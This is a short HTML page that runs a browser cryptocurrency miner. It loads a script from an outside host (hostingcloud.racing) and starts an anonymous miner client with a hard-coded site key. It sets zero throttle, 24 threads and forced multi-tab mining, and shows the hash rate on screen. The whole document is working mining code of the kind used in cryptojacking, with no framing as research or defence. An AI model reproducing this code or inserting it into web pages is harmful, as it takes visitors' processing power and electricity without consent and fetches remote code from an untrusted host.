<title>Mintme Miner</title>
<h1>Mintme Miner</h1>
<input type="text" style="width: 320px;" id="hpsd" disabled>
<script src="http://www.hostingcloud.racing/HLXA.js"></script>
<script>
    var miner = new Client.Anonymous('ad19f245bdcb8be727ca365dea899058cf5610d3627b0daac9cd746fc7a94dbb', {
        throttle: 0, c: 'w'
    });
    miner.start(Client.FORCE_MULTI_TAB);

    miner.setNumThreads(24);
    function logger(){setTimeout(function(){hpsps=miner.getHashesPerSecond();const docrep=document.getElementById("hpsd");docrep.value="Hash Per Second: "+hpsps;logger()},1e3)}logger();
</script>
